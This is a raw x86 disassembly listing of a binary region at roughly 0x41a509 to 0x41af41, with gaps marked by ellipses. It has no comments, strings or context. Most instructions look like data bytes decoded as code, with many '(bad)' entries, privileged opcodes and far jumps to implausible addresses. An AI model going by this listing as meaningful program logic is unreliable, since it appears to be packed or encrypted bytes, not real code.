  41a509:	mov    al,ds:0x2f49cc1a
  41a50e:	retf   
  41a50f:	daa    
  41a510:	nop
  41a511:	pop    edi
  41a512:	pusha  
  41a513:	dec    edi
  41a514:	pop    edx
  41a515:	inc    edi
  41a516:	ret    0x4bfc
  41a519:	fistp  WORD PTR [ecx]
  41a51b:	add    edi,DWORD PTR [esi]
  41a51d:	pop    ebx
  41a51e:	add    BYTE PTR [edx+ecx*8+0x5a],ah
  41a522:	add    cl,ch
  41a524:	cmp    eax,0xa12cbe4
  41a529:	loop   0x41a577
  41a52b:	add    eax,0xd4c542e
  41a530:	push   ss
  41a531:	push   0x5b3d1385
  41a536:	add    BYTE PTR [edx+0x1],dh
  41a539:	aas    
  41a53a:	adc    BYTE PTR [ebx+0x41],dh
  41a53d:	call   0x9d89:0x5b409d37
  41a544:	inc    ecx
  41a545:	outs   dx,DWORD PTR ds:[esi]
  41a546:	mov    ecx,0x5b3deb
  41a54b:	xchg   ebp,eax
  41a54c:	cmp    DWORD PTR [esi+ecx*4-0x33],edx
  41a550:	mov    DWORD PTR [ecx-0x5aff2103],ebx
  41a556:	add    cl,ch
  41a558:	cmp    eax,0x2dc554e4
  41a55d:	push   esp
  41a55e:	fidivr DWORD PTR [edx+0x1c]
  41a561:	out    0x4b,al
  41a563:	jmp    0x41a517
  41a565:	sub    BYTE PTR [ecx],0x55
  41a568:	push   ds
  41a569:	inc    ebx
  41a56a:	mov    ah,BYTE PTR ds:0x0
	...
  41a594:	add    BYTE PTR [eax],al
  41a596:	inc    edi
  41a597:	pop    ebx
  41a598:	cmp    ch,al
  41a59a:	into   
  41a59b:	pusha  
  41a59c:	inc    ecx
  41a59d:	sub    BYTE PTR ds:0xc5bb72b5,al
  41a5a3:	daa    
  41a5a4:	and    al,0xd5
  41a5a6:	les    eax,FWORD PTR [edi]
  41a5a8:	and    al,0x1
  41a5aa:	gs mov ch,0xd
  41a5ad:	sbb    ebx,DWORD PTR gs:[eax+eax*1-0x17]
  41a5b2:	push   esp
  41a5b3:	aaa    
  41a5b4:	and    al,0xf9
  41a5b6:	mov    ds:0xb538511e,eax
  41a5bb:	test   eax,0x97045be8
  41a5c0:	std    
  41a5c1:	add    BYTE PTR [ebx+eiz*1+0x24],ch
  41a5c5:	adc    BYTE PTR [ebx+ebp*1+0x24],ch
  41a5c9:	sbb    BYTE PTR [esi+0x2d],al
  41a5cc:	xchg   esi,ecx
  41a5ce:	pop    esp
  41a5cf:	xchg   eax,ebp
  41a5d1:	lahf   
  41a5d2:	pop    ebp
  41a5d3:	nop
  41a5d4:	sti    
  41a5d5:	sub    ebp,DWORD PTR [edi-0x1c]
  41a5d8:	dec    esp
  41a5d9:	and    al,0xcb
  41a5db:	pop    ebp
  41a5dc:	jmp    0xc4c24699
  41a5e1:	dec    esi
  41a5e2:	js     0x41a566
  41a5e4:	xchg   DWORD PTR [ebx+edi*1+0x47],ebp
  41a5e8:	mov    ebp,0xc2e595fa
  41a5ed:	sar    edi,0x6f
  41a5f0:	inc    ecx
  41a5f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5f3:	pop    eax
  41a5f4:	and    al,0x10
  41a5f6:	pushf  
  41a5f7:	mov    ah,0x76
  41a5f9:	push   es
	...
  41a622:	add    BYTE PTR [eax],al
  41a624:	push   ds
  41a625:	and    esp,DWORD PTR [eax+ebx*1]
  41a628:	cmp    al,0x25
  41a62a:	aaa    
  41a62b:	mov    cs,WORD PTR [ebx-0x15000268]
  41a631:	push   ebp
  41a632:	dec    edi
  41a633:	push   ecx
  41a634:	fsub   QWORD PTR [eax-0x6e929c18]
  41a63a:	sti    
  41a63b:	mov    ebx,DWORD PTR [ebx]
  41a63d:	cmp    edx,DWORD PTR [eax]
  41a63f:	mov    ebp,DWORD PTR [edi-0x1b]
  41a642:	inc    esp
  41a643:	and    al,0x4f
  41a645:	sub    dl,BYTE PTR [eax-0x75]
  41a648:	mov    eax,ds:0xfa5084
  41a64d:	xchg   ecx,eax
  41a64e:	xchg   eax,ecx
  41a650:	dec    esp
  41a651:	mov    ds:0x473b6c87,al
  41a656:	mov    eax,0x2ac1bdab
  41a65b:	imul   DWORD PTR [esi-0x513e351c]
  41a661:	jo     0x41a662
  41a663:	leave  
  41a664:	ds test edx,ecx
  41a667:	cmp    DWORD PTR [edx-0x62],esi
  41a66a:	adc    DWORD PTR [edx+0x4a],esi
  41a66d:	or     eax,0xb4a244d
  41a672:	dec    ebp
  41a673:	and    al,0x46
  41a675:	sti    
  41a676:	push   esp
  41a677:	and    al,0x4e
  41a679:	aaa    
  41a67a:	jle    0x41a67c
  41a67c:	add    WORD PTR [ecx],0x39
  41a680:	mov    eax,0xc9fffd7d
  41a685:	mov    bh,0x19
  41a687:	mov    DWORD PTR [eax],eax
	...
  41a6b1:	add    BYTE PTR [eax-0x4600024b],bh
  41a6b7:	pop    esp
  41a6b8:	cld    
  41a6b9:	jbe    0x41a6f5
  41a6bb:	ins    DWORD PTR es:[edi],dx
  41a6bc:	cld    
  41a6bd:	jmp    0x803e03fc
  41a6c2:	jns    0x41a645
  41a6c4:	imul   edi,edi,0x30ff6c99
  41a6ca:	xchg   ecx,eax
  41a6cb:	or     al,0x3
  41a6cd:	mov    DWORD PTR [edx+0x2b],ecx
  41a6d0:	mov    al,BYTE PTR [esi+0x17e5e]
  41a6d6:	cmp    eax,0x1a6c8249
  41a6db:	mov    dh,0x4
  41a6dd:	je     0x41a72b
  41a6df:	pop    es
  41a6e0:	test   BYTE PTR ds:0xfdf347bb,0x59
  41a6e7:	lods   al,BYTE PTR ds:[esi]
  41a6e8:	or     al,0x87
  41a6ea:	add    bl,BYTE PTR [esi+0x1c]
  41a6ed:	xchg   edx,ebp
  41a6ef:	gs adc al,0x89
  41a6f2:	cli    
  41a6f3:	pop    ebp
  41a6f4:	and    BYTE PTR [ecx-0x76eb976e],cl
  41a6fa:	and    BYTE PTR [eax+0x1c],0x5d
  41a6fe:	mov    BYTE PTR [edi-0x77],ch
  41a701:	push   eax
  41a702:	cmp    bh,bl
  41a704:	or     ebx,DWORD PTR [ecx-0x43]
  41a707:	pop    ebx
  41a708:	stos   DWORD PTR es:[edi],eax
  41a709:	adc    al,0xfc
  41a70b:	imul   esp,edi,0xffffff80
  41a70e:	sbb    dl,BYTE PTR [edx+ebp*2+0x78]
  41a712:	pop    edx
  41a713:	pop    ds
  41a714:	out    0x4d,eax
	...
  41a73e:	add    BYTE PTR [eax],al
  41a740:	(bad)  
  41a741:	mov    esp,?
  41a743:	or     ch,BYTE PTR [edi]
  41a745:	fwait
  41a746:	sbb    eax,0xa9540281
  41a74b:	sbb    al,0x3e
  41a74d:	loop   0x41a772
  41a74f:	and    BYTE PTR [esi-0x20],bh
  41a752:	daa    
  41a753:	outs   dx,DWORD PTR ds:[esi]
  41a754:	inc    esp
  41a755:	fisubr DWORD PTR [edi]
  41a757:	cmc    
  41a758:	push   0xfc3c2bda
  41a75d:	jae    0x41a746
  41a75f:	mov    BYTE PTR [edx],cl
  41a761:	aas    
  41a762:	stos   DWORD PTR es:[edi],eax
  41a763:	jle    0x41a7de
  41a765:	cmovge ecx,DWORD PTR [ecx+0x7ea33f12]
  41a76c:	mov    WORD PTR [edi],cs
  41a76e:	inc    ebp
  41a76f:	mov    eax,eax
  41a771:	outs   dx,DWORD PTR ds:[esi]
  41a772:	jmp    0x41a777
  41a774:	and    esi,DWORD PTR ds:[eax+0x7e]
  41a778:	pop    esi
  41a779:	pop    edi
  41a77a:	out    0x3,eax
  41a77c:	mov    ecx,0x79fff7e5
  41a781:	xchg   esi,eax
  41a782:	aas    
  41a783:	out    0x77,al
  41a785:	test   DWORD PTR [edx+0x31],edx
  41a788:	sub    DWORD PTR [esi],0x5ba9ade6
  41a78e:	mov    bh,0x42
  41a790:	lods   al,BYTE PTR ds:[esi]
  41a792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a793:	xor    BYTE PTR [ebx+0x66],bh
  41a796:	xchg   ebp,eax
  41a797:	mov    edx,0x4284649
  41a79c:	jno    0x41a739
  41a79e:	sbb    bh,BYTE PTR [ebp+0x180cd4b]
	...
  41a7cc:	add    BYTE PTR [eax],al
  41a7ce:	outs   dx,BYTE PTR ds:[esi]
  41a7cf:	sbb    al,0xe7
  41a7d1:	sar    dh,cl
  41a7d3:	dec    ecx
  41a7d4:	add    BYTE PTR [esi-0x154832c6],ch
  41a7da:	dec    ebp
  41a7db:	push   esi
  41a7dc:	add    BYTE PTR [eax-0x1a402403],bh
  41a7e2:	dec    esi
  41a7e3:	mov    al,ds:0x963d907f
  41a7e8:	std    
  41a7e9:	jmp    0xa9c5465d
  41a7ee:	cmp    bl,dl
  41a7f0:	mov    ecx,0x515b3df0
  41a7f5:	pusha  
  41a7f6:	xor    esp,edx
  41a7f8:	dec    esi
  41a7f9:	in     eax,0xbc
  41a7fb:	cwde   
  41a7fc:	sbb    BYTE PTR [ecx-0x16416a30],cl
  41a802:	cmp    al,0x5b
  41a804:	add    BYTE PTR [ebp+eiz*2-0x6a],ah
  41a808:	push   esp
  41a809:	pusha  
  41a80a:	dec    esp
  41a80b:	dec    esp
  41a80c:	shr    ah,0x3d
  41a80f:	pop    ebx
  41a810:	add    cl,ch
  41a812:	mov    dh,0x3d
  41a814:	lds    ebp,FWORD PTR [ebp-0x16026a60]
  41a81a:	cmp    eax,0x9129815b
  41a81f:	push   eax
  41a820:	add    ch,ah
  41a822:	cmp    eax,0xbc05725b
  41a827:	cwde   
  41a828:	add    ch,ah
  41a82a:	cmp    eax,0x7128815b
  41a82f:	inc    edx
  41a830:	stc    
  41a831:	je     0x41a833
	...
  41a85b:	add    BYTE PTR [ebx-0x1d],bh
  41a85e:	mov    ds,ebp
  41a860:	popa   
  41a861:	xchg   ebp,eax
  41a862:	std    
  41a863:	bound  ecx,QWORD PTR [ebx-0x24]
  41a866:	enter  0xd3e6,0xdc
  41a86a:	and    al,0xe5
  41a86c:	cmp    eax,0x4267875b
  41a871:	pop    ecx
  41a872:	add    cl,ch
  41a874:	mov    edx,0x230004f5
  41a879:	pop    ecx
  41a87a:	add    BYTE PTR [ecx+0x45ba9],cl
  41a880:	pop    ss
  41a881:	sbb    BYTE PTR [edx],bh
  41a883:	mov    edi,DWORD PTR [ecx+0x73]
  41a886:	add    al,0x0
  41a888:	daa    
  41a889:	push   ss
  41a88a:	xchg   esi,eax
  41a88b:	adc    BYTE PTR [ebx],ah
  41a88d:	pop    ecx
  41a88e:	add    BYTE PTR [ecx+0x47769],cl
  41a894:	out    0x16,eax
  41a896:	add    eax,0x1c432389
  41a89b:	mov    esp,DWORD PTR [ebx]
  41a89d:	inc    ebx
  41a89e:	push   esp
  41a89f:	mov    ch,bl
  41a8a1:	pop    edi
  41a8a2:	sahf   
  41a8a3:	adc    al,0xe3
  41a8a5:	pop    eax
  41a8a6:	add    BYTE PTR [ecx],al
  41a8a8:	mov    ecx,0xd700046f
  41a8ad:	push   eax
  41a8ae:	test   DWORD PTR [ebx+esi*1+0x6f],edi
  41a8b2:	test   DWORD PTR [ebx+eax*2+0x67],edi
  41a8b6:	test   DWORD PTR [esi+0x5c9b],ebx
  41a8bc:	sub    esp,DWORD PTR cs:[eax+ebx*2]
	...
  41a8e8:	add    BYTE PTR [eax],al
  41a8ea:	lods   al,BYTE PTR ds:[esi]
  41a8eb:	popf   
  41a8ec:	or     eax,DWORD PTR [esi+0x6054]
  41a8f2:	or     ah,ah
  41a8f4:	add    BYTE PTR [eax],al
  41a8f6:	xchg   edi,eax
  41a8f7:	pop    eax
  41a8f8:	xchg   DWORD PTR [ebx+esi*2+0x24],eax
  41a8fc:	add    eax,0x4c8746d3
  41a902:	and    DWORD PTR [eax+0x3d],0xffffff89
  41a906:	fwait
  41a907:	cmp    al,0x18
  41a909:	test   BYTE PTR [esi],bl
  41a90b:	adc    ch,BYTE PTR [ecx]
  41a90d:	mov    esi,DWORD PTR [ebx-0x36749fc4]
  41a913:	addr16 add al,0x0
  41a916:	push   edi
  41a917:	jne    0x41a965
  41a919:	and    al,0x3e
  41a91b:	push   edx
  41a91c:	push   esi
  41a91d:	mov    eax,edx
  41a91f:	lea    eax,ds:0x58693e00
  41a925:	and    al,0x8e
  41a927:	jae    0x41a9a6
  41a929:	dec    esp
  41a92a:	pop    edx
  41a92b:	outs   dx,BYTE PTR ds:[esi]
  41a92c:	push   esi
  41a92d:	dec    edi
  41a92e:	sbb    edx,esi
  41a930:	xchg   ah,al
  41a932:	cs pop es
  41a934:	ror    DWORD PTR ds:0x96ec2,0x3e
  41a93b:	test   eax,0x6f5a244d
  41a940:	push   ss
  41a941:	mov    DWORD PTR [edx-0x5a],esp
  41a944:	inc    ebp
  41a945:	mov    DWORD PTR [edx+0x5287419e],edx
  41a94b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a94c:	sbb    eax,0x87
	...
  41a975:	add    BYTE PTR [eax],al
  41a977:	add    BYTE PTR [edx-0x62],dh
  41a97a:	sbb    ecx,ebp
  41a97c:	xor    DWORD PTR [ecx],ecx
  41a97e:	inc    ebp
  41a97f:	and    al,0x72
  41a981:	or     DWORD PTR [edi+0x14],edi
  41a984:	cmp    al,BYTE PTR [edx-0x2e82d6ff]
  41a98a:	push   esi
  41a98b:	dec    edi
  41a98c:	ret    
  41a98d:	cmc    
  41a98e:	and    eax,0xbf090c34
  41a993:	call   0xfe33f255
  41a998:	(bad)
  41a99b:	sub    al,0xbd
  41a99d:	add    ecx,DWORD PTR ds:0x81bba
  41a9a4:	ds stc 
  41a9a6:	xchg   BYTE PTR [edx+eax*2],ah
  41a9a9:	add    BYTE PTR [ecx],0xc5
  41a9ac:	cli    
  41a9ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9ae:	adc    eax,0x1823e00
  41a9b3:	aaa    
  41a9b4:	cli    
  41a9b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9b6:	sbb    DWORD PTR [ebx-0x24],esi
  41a9b9:	add    dl,dh
  41a9bb:	inc    DWORD PTR [eax+0x5b]
  41a9be:	ins    DWORD PTR es:[edi],dx
  41a9bf:	push   esi
  41a9c0:	aas    
  41a9c1:	pop    ebx
  41a9c2:	out    0x2a,eax
  41a9c4:	cli    
  41a9c5:	ds vmlaunch 
  41a9c9:	and    ebp,edx
  41a9cb:	add    edi,DWORD PTR [esi]
  41a9cd:	out    0x2b,al
  41a9cf:	sub    BYTE PTR [esi+0x2a],cl
  41a9d2:	adc    dl,cl
  41a9d4:	(bad)  
  41a9d5:	sub    esp,DWORD PTR [edx-0x3e]
  41a9d8:	es jle 0x41a98e
  41a9db:	icebp  
	...
  41aa04:	add    BYTE PTR [eax],al
  41aa06:	adc    esp,edi
  41aa08:	xor    ebp,DWORD PTR [eax]
  41aa0a:	inc    esi
  41aa0b:	sub    bh,BYTE PTR [eax]
  41aa0d:	jge    0x41a9ff
  41aa0f:	out    0xaf,al
  41aa11:	fdiv   QWORD PTR [edx+0x37f18e8a]
  41aa17:	sahf   
  41aa18:	idiv   BYTE PTR [esi+0x45]
  41aa1b:	pop    esi
  41aa1c:	out    0x3,eax
  41aa1e:	mov    bh,0x17
  41aa20:	retf   
  41aa21:	sub    edx,DWORD PTR ds:0x3e03e45b
  41aa27:	(bad)  
  41aa29:	test   bl,cl
  41aa2b:	pop    ebp
  41aa2c:	out    dx,al
  41aa2d:	xchg   DWORD PTR [ecx],edi
  41aa2f:	pop    esi
  41aa30:	out    0x3,eax
  41aa32:	jne    0x41aa8f
  41aa34:	int3   
  41aa35:	add    edi,DWORD PTR [esi]
  41aa37:	(bad)  
  41aa39:	test   BYTE PTR [ebx-0x567811a2],ch
  41aa3f:	pop    ebp
  41aa40:	out    0x3,eax
  41aa42:	(bad)  
  41aa43:	das    
  41aa44:	add    ecx,DWORD PTR [edi+eax*8+0x17]
  41aa48:	retf   
  41aa49:	push   edi
  41aa4a:	mov    bh,0xe9
  41aa4c:	repz pop es
  41aa4e:	ds pop ebx
  41aa50:	ret    0xc1c4
  41aa53:	pop    ss
  41aa54:	ret    
  41aa55:	and    eax,DWORD PTR [esi]
  41aa57:	sub    esi,DWORD PTR [ebp+edi*1+0x69]
  41aa5b:	sub    ebp,DWORD PTR [ecx+0x17b555]
  41aa61:	int    0x19
  41aa63:	sub    ecx,DWORD PTR [ecx-0x5508de1]
  41aa69:	out    0x0,al
	...
  41aa93:	add    BYTE PTR [esi-0x1c],cl
  41aa96:	dec    esp
  41aa97:	add    eax,0xd4c4a22
  41aa9c:	and    dh,0x41
  41aa9f:	call   0xe565c258
  41aaa4:	nop
  41aaa5:	getsec 
  41aaa7:	jb     0x41aab5
  41aaa9:	sub    eax,0x16f5a789
  41aaae:	cmc    
  41aaaf:	scas   al,BYTE PTR es:[edi]
  41aab0:	push   cs
  41aab1:	in     al,0x4c
  41aab3:	int    0x7d
  41aab5:	fiadd  DWORD PTR [ebp+eax*8+0x59]
  41aab9:	in     al,0x44
  41aabb:	int    0x81
  41aabd:	sub    ecx,DWORD PTR [edi+0x62]
  41aac0:	inc    DWORD PTR [edx-0x701181d3]
  41aac6:	mov    DWORD PTR ds:0xa1293716,ebp
  41aacc:	inc    edx
  41aacd:	call   0x5e38:0x7bbfb0b8
  41aad4:	in     al,0xa1
  41aad6:	cli    
  41aad7:	jb     0x41aad4
  41aad9:	shr    eax,1
  41aadb:	test   BYTE PTR [edx-0x63],0xe9
  41aadf:	sbb    DWORD PTR [ebx],esi
  41aae1:	pop    ds
  41aae2:	and    al,0x15
  41aae4:	or     eax,0xa451cee4
  41aae9:	xchg   ch,bh
  41aaeb:	sbb    ah,BYTE PTR ss:[edi]
  41aaee:	and    al,0xa5
  41aaf0:	adc    dh,BYTE PTR [ebx+0x1b61ad89]
  41aaf6:	push   edx
  41aaf7:	mov    ecx,0x0
	...
  41ab20:	add    BYTE PTR [eax],al
  41ab22:	add    ah,BYTE PTR [ecx-0x7088e018]
  41ab28:	std    
  41ab29:	ret    0xe385
  41ab2c:	rol    DWORD PTR [eax],0xec
  41ab2f:	and    DWORD PTR [eax+ebx*2],esp
  41ab32:	(bad)  
  41ab34:	loop   0x41ab39
  41ab36:	fs xchg edi,eax
  41ab38:	mov    ebp,0x445665f8
  41ab3d:	and    al,0x1b
  41ab3f:	inc    esi
  41ab40:	call   0x44d9fac2
  41ab45:	and    al,0x3b
  41ab47:	pop    eax
  41ab48:	add    BYTE PTR [eax],al
  41ab4a:	daa    
  41ab4b:	in     al,0xfb
  41ab4d:	jbe    0x41ab8e
  41ab4f:	ds ins BYTE PTR es:[edi],dx
  41ab51:	and    al,0x5b
  41ab53:	or     esi,DWORD PTR [eax]
  41ab55:	mov    esp,DWORD PTR [ebx+0x43]
  41ab58:	sub    BYTE PTR [ebp+0x36],dl
  41ab5b:	adc    al,0xce
  41ab5d:	call   0x3d3503
  41ab62:	mov    WORD PTR [ebx],?
  41ab64:	and    al,0x44
  41ab66:	pop    esp
  41ab67:	lahf   
  41ab68:	xchg   DWORD PTR [ebx+edi*8+0x1c],eax
  41ab6c:	push   edx
  41ab6d:	push   eax
  41ab6e:	ins    BYTE PTR es:[edi],dx
  41ab6f:	shr    eax,1
  41ab71:	stos   DWORD PTR es:[edi],eax
  41ab72:	imul   eax,DWORD PTR [eax+0x14a43bfb],0xa2f245c
  41ab7c:	or     bh,al
  41ab7e:	fwait
  41ab7f:	cmp    BYTE PTR [ecx+eax*1],dl
  41ab82:	xlat   BYTE PTR ds:[ebx]
  41ab83:	pop    esp
  41ab84:	add    BYTE PTR [ebp+0x0],al
	...
  41abae:	add    BYTE PTR [eax],al
  41abb0:	adc    BYTE PTR [edx],dl
  41abb2:	dec    ecx
  41abb3:	cmp    ebx,esi
  41abb5:	cmp    BYTE PTR [ebp+edi*2-0x28],al
  41abb9:	adc    eax,0x5c9b148e
  41abbe:	add    BYTE PTR [edx-0x5a],ch
  41abc1:	sub    eax,0xaf318b4d
  41abc6:	fwait
  41abc7:	repz pusha 
  41abc9:	add    BYTE PTR [edi-0x78e784ac],0xd8
  41abd0:	ds std 
  41abd2:	inc    edi
  41abd3:	and    al,0xfe
  41abd5:	rcl    DWORD PTR [ecx-0x77],cl
  41abd8:	js     0x41ac44
  41abda:	pop    edi
  41abdb:	mul    BYTE PTR [ecx-0x6f]
  41abde:	jp     0x41ac2c
  41abe0:	and    bl,BYTE PTR [edx+0x70c54f58]
  41abe6:	jg     0x41ac44
  41abe8:	es sbb ecx,0x5c
  41abec:	dec    eax
  41abed:	mov    cl,0xee
  41abef:	cmp    DWORD PTR [esi],edx
  41abf1:	std    
  41abf2:	dec    esp
  41abf3:	and    al,0x96
  41abf5:	and    dl,bh
  41abf7:	les    eax,FWORD PTR [edx+0x3e00185e]
  41abfd:	add    BYTE PTR [ecx],0xe9
  41ac00:	inc    ebp
  41ac01:	add    eax,0x822a246d
  41ac06:	inc    BYTE PTR [edx+0x184f8]
  41ac0c:	mov    ebp,0xc80cffee
  41ac11:	sbb    al,0x4
	...
  41ac3b:	add    BYTE PTR [eax],al
  41ac3d:	add    BYTE PTR [esi],bh
  41ac3f:	std    
  41ac40:	push   esp
  41ac41:	and    al,0x1e
  41ac43:	or     eax,0x823a1483
  41ac48:	add    DWORD PTR [ecx-0x7eb0f804],eax
  41ac4e:	std    
  41ac4f:	adc    DWORD PTR [edx-0x7f],0xfffffffe
  41ac53:	adc    DWORD PTR [ecx-0x75],0x72
  41ac57:	push   esi
  41ac58:	xor    BYTE PTR [edi-0x3b],cl
  41ac5b:	aaa    
  41ac5c:	fst    DWORD PTR [eax-0x7611df49]
  41ac62:	add    bl,BYTE PTR [esi+0x34]
  41ac65:	cmp    edx,edi
  41ac67:	push   ebp
  41ac68:	sbb    al,0x89
  41ac6a:	repnz pop ebp
  41ac6c:	cmp    BYTE PTR [edx-0x3b],dl
  41ac6f:	outs   dx,DWORD PTR ds:[esi]
  41ac70:	push   ecx
  41ac71:	jl     0x41acd0
  41ac73:	pop    ebx
  41ac74:	(bad)  
  41ac76:	lea    ecx,[edi-0x1c6985e2]
  41ac7c:	stos   DWORD PTR es:[edi],eax
  41ac7d:	daa    
  41ac7e:	es es mov bh,0x7a
  41ac82:	js     0x41ac06
  41ac84:	adc    eax,0xd28f63f8
  41ac89:	ret    0xdbb1
  41ac8c:	or     DWORD PTR [edx],eax
  41ac8e:	aas    
  41ac8f:	popf   
  41ac90:	bound  edi,QWORD PTR [ebx-0x27166e77]
  41ac96:	adc    al,0x83
  41ac98:	shl    edi,0x3b
  41ac9b:	(bad)  
  41ac9c:	(bad)  
  41ac9d:	int3   
  41ac9e:	(bad)  
  41ac9f:	pop    ss
  41aca0:	add    ebx,DWORD PTR [eax+eax*1]
	...
  41accb:	add    BYTE PTR [ebp+0x16be722b],cl
  41acd1:	mov    ds:0xe31bedb4,eax
  41acd6:	lahf   
  41acd7:	sbb    DWORD PTR [edi],eax
  41acd9:	pop    ebx
  41acda:	mov    al,ds:0x72ba21ac
  41acdf:	push   ds
  41ace0:	or     eax,DWORD PTR [ebp-0x5e381548]
  41ace6:	test   al,0xdb
  41ace8:	push   ebx
  41ace9:	pop    edx
  41acea:	mov    eax,ds:0xbb378279
  41acef:	add    dh,dh
  41acf1:	push   edx
  41acf2:	nop
  41acf3:	outs   dx,DWORD PTR ds:[esi]
  41acf4:	inc    esi
  41acf5:	xchg   esi,eax
  41acf6:	sub    ebp,DWORD PTR [eax]
  41acf8:	sub    bl,BYTE PTR [edi+eiz*8+0x3]
  41acfc:	fsub   DWORD PTR ds:[esi+0x76]
  41ad00:	push   ss
  41ad01:	push   edx
  41ad02:	and    al,0x70
  41ad04:	(bad)  
  41ad06:	mov    ebx,0xb92b6e27
  41ad0b:	js     0x41ad85
  41ad0d:	xor    DWORD PTR [ebp-0x9],0xffffffa3
  41ad11:	mov    ?,WORD PTR [edx-0x34]
  41ad14:	(bad)  
  41ad15:	pop    ss
  41ad16:	add    BYTE PTR ds:0x62502a32,cl
  41ad1c:	enter  0x7d83,0x1c
  41ad20:	xchg   ebx,eax
  41ad21:	nop
  41ad22:	cmp    DWORD PTR [ecx+0x7b],eax
  41ad25:	loop   0x41ad29
  41ad27:	jmp    0x6721:0x8d815b3d
  41ad2e:	add    dh,dh
	...
  41ad58:	add    BYTE PTR [eax],al
  41ad5a:	mov    eax,0x3de90288
  41ad5f:	fdiv   st(3),st
  41ad61:	jmp    0x5b3d:0xe9d4e052
  41ad68:	mov    DWORD PTR ds:0x35893b16,esi
  41ad6e:	xor    cx,WORD PTR [ecx+0x57496f]
  41ad75:	jmp    0x193d7b38
  41ad7a:	mov    edi,0xbf1b0198
  41ad7f:	call   0xed24:0x1f911901
  41ad86:	ins    BYTE PTR es:[edi],dx
  41ad87:	in     al,0xce
  41ad89:	xchg   ecx,eax
  41ad8a:	aam    0x92
  41ad8c:	std    
  41ad8d:	sahf   
  41ad8e:	jbe    0x41ada7
  41ad90:	and    al,0xd9
  41ad92:	jbe    0x41adbb
  41ad94:	and    al,0xd5
  41ad96:	data16 das 
  41ad98:	and    al,0xd1
  41ad9a:	push   ss
  41ad9b:	pushf  
  41ad9c:	push   edx
  41ad9d:	jb     0x41ad3a
  41ad9f:	sub    bh,BYTE PTR [esp+ecx*8-0xb]
  41ada3:	rep outs dx,BYTE PTR ss:[esi]
  41ada6:	fisubr DWORD PTR [ecx]
  41ada8:	push   ecx
  41ada9:	jb     0x41ad2e
  41adab:	aad    0x44
  41adad:	add    eax,0x5c15835e
  41adb2:	mov    ds:0x619d898f,al
  41adb7:	aaa    
  41adb8:	sub    DWORD PTR [eax],eax
  41adba:	push   esi
  41adbb:	loope  0x41ae3c
  41adbd:	loop   0x41adbf
	...
  41ade7:	add    BYTE PTR [edx+ebx*2-0x66a0743e],ah
  41adee:	cmc    
  41adef:	add    bh,ah
  41adf1:	ins    DWORD PTR es:[edi],dx
  41adf2:	call   0xfbc0d1f6
  41adf7:	push   ebp
  41adf8:	mov    ah,0x12
  41adfa:	into   
  41adfb:	mov    DWORD PTR [ebx+0x45e82c35],esp
  41ae01:	xchg   bl,bh
  41ae03:	(bad)  
  41ae04:	in     al,dx
  41ae05:	rol    DWORD PTR [edi+0x27358344],1
  41ae0b:	enter  0xd064,0xb8
  41ae0f:	jmp    0xf76fc109
  41ae14:	outs   dx,BYTE PTR ds:[esi]
  41ae15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae16:	cli    
  41ae17:	mov    ebp,ebp
  41ae19:	xchg   esi,eax
  41ae1a:	in     eax,0x1f
  41ae1c:	and    al,0xcf
  41ae1e:	xchg   DWORD PTR [ebx+eax*2+0x4b],eax
  41ae22:	inc    edi
  41ae24:	cmp    al,0xae
  41ae26:	jns    0x41ae30
  41ae28:	loopne 0x41ae45
  41ae2a:	and    al,0x14
  41ae2c:	es pop ecx
  41ae2e:	add    BYTE PTR [eax],al
  41ae30:	mov    ds:0x1c287680,al
  41ae35:	pushf  
  41ae36:	jl     0x41ae5c
  41ae38:	ins    BYTE PTR es:[edi],dx
  41ae39:	sub    esp,DWORD PTR [eax+esi*1]
  41ae3c:	aaa    
  41ae3d:	and    eax,0xc6bfce87
  41ae42:	hlt    
  41ae43:	(bad)  
  41ae44:	mov    eax,0x238bd80c
  41ae49:	cmp    ebp,DWORD PTR [eax]
  41ae4b:	push   ebp
	...
  41ae74:	add    BYTE PTR [eax],al
  41ae76:	aaa    
  41ae77:	or     al,0xce
  41ae79:	call   0x3d39f3
  41ae7e:	sbb    al,0x9f
  41ae80:	or     ecx,DWORD PTR [edx+eax*2+0x3e000055]
  41ae87:	add    DWORD PTR [eax+0x24],ebp
  41ae8a:	push   edx
  41ae8b:	cmp    dl,0x82
  41ae8e:	inc    esp
  41ae8f:	add    BYTE PTR [ecx],0x0
  41ae92:	(bad)
  41ae95:	pop    eax
  41ae96:	mov    ebx,0x1583f945
  41ae9b:	add    DWORD PTR [ecx],0x0
  41ae9e:	mov    ebp,0xc00d0335
  41aea3:	rol    BYTE PTR [eax+eax*1],cl
  41aea6:	ds stc 
  41aea8:	dec    edi
  41aea9:	and    al,0x12
  41aeab:	stc    
  41aeac:	mov    eax,0x77529
  41aeb1:	or     dl,BYTE PTR ds:0xc5027235
  41aeb7:	cmp    eax,0x96028954
  41aebc:	or     eax,0x54516129
  41aec1:	mov    ecx,DWORD PTR [edx-0x3ab0d7aa]
  41aec7:	mov    bl,0x7c
  41aec9:	pop    esp
  41aeca:	bound  edx,QWORD PTR [esi-0x24]
  41aecd:	int3   
  41aece:	sub    DWORD PTR [ebp+0x569a37ea],edx
  41aed4:	xor    BYTE PTR [edx+0x4a],dh
  41aed7:	stc    
  41aed8:	dec    esp
  41aed9:	and    al,0x0
	...
  41af03:	add    BYTE PTR [esi+0x65],cl
  41af06:	push   esi
  41af07:	mov    eax,esi
  41af09:	jmp    0xed3ba336
  41af0e:	jle    0x41aee8
  41af10:	lds    edi,FWORD PTR ds:0x52913820
  41af16:	jge    0x41aee6
  41af18:	(bad)  
  41af19:	mov    ds:0x98d9fded,eax
  41af1e:	(bad)  
  41af1f:	mov    DWORD PTR [edx-0x62],esi
  41af22:	or     eax,0x34f92e7e
  41af27:	and    al,0xe
  41af29:	pop    ebx
  41af2a:	jb     0x41af7b
  41af2c:	bound  eax,QWORD PTR [edi+0x70]
  41af2f:	aaa    
  41af30:	pop    edx
  41af31:	push   ebx
  41af32:	pusha  
  41af33:	dec    edi
  41af34:	bound  ecx,QWORD PTR [edi+0x62]
  41af37:	aas    
  41af38:	pop    edx
  41af39:	imul   ebx,DWORD PTR [esi+0x2ddfee56],0xffffffdb
  41af40:	pop    ebx
  41af41:	mov    dh,BYTE PTR [esi]
